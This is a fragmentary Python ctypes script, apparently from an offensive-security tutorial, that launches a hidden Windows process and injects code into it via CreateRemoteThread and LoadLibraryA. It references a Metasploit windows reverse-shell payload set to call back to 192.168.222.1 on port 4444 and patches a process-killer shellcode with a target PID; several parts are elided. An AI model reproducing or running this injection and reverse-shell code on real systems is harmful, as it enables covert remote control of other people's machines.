...
startinfo.dwFlags = 0x1
startinfo.wShowWindow = 0x0
startinfo.cb = sizeof(startinfo)

# First thing, fire up that second process
# and store its PID so thatt we can do out injection
kernel32.CreateProcessA(path_to_exe, None, None, None, 
						None, creation_flags, None, None, byref(startinfo), byref(process_information))
pid  = process_information.dwProcessId

def inject(pid, data, param = 0):
	# Get a handle to the process we are injection into.
	...
	if not h_process:
		...
		thread_id = c_ulong(0)
		if not param:
			start_address = c_ulong(0)
		else:
			h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
			start_address = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")
			param = arg_address
		if not kernel32.CreateRemoteThread(h_process, None, 0, start_address, param, byref(thread_id)):
...
#  win32_revese - EXIFUNC=thread LHOST=192.168.222.1 LPORT=4444
# Size=287 Encoder=None https:metasploit.com 
...
padding = 4 - (len(out_pid))
replace_value = out_pid + ("\x00" * padding)
replace_string = "\x41" * 4
process_killer_shellcode = process.process_killer_shellcode.replace(replace_string, replace_value)
